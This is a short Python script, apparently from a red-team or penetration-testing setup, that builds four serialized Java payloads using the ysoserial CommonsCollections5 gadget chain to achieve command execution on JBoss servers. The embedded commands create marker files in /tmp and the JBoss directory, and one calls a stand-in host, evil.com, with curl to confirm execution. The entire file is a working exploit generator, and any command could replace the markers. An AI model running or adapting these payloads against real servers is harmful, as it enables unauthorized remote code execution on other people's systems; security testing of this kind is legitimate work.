# -*- coding: utf-8 -*-
"""RT-4 JBoss payload generation (CC5, four variants)."""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

from common import gen_yso  # noqa: E402

JOBS = [
    ("rt4_rv.ser", "touch /tmp/pwn_rt4_jboss_rv"),
    ("rt4_a1.ser", "touch /tmp/hsperfdata_root/pwn_rt4_jboss_a1"),
    ("rt4_b2.ser", "curl -m 5 -s http://evil.com:8000/rt/rt4_jboss_b2"),
    ("rt4_t3.ser", "touch /jboss-6.1.0.Final/pwn_rt4_jboss_t3"),
]

for name, cmd in JOBS:
    p = gen_yso("CommonsCollections5", cmd, os.path.join(HERE, "out", name))
    print("[+] %s <- %s" % (name, cmd))
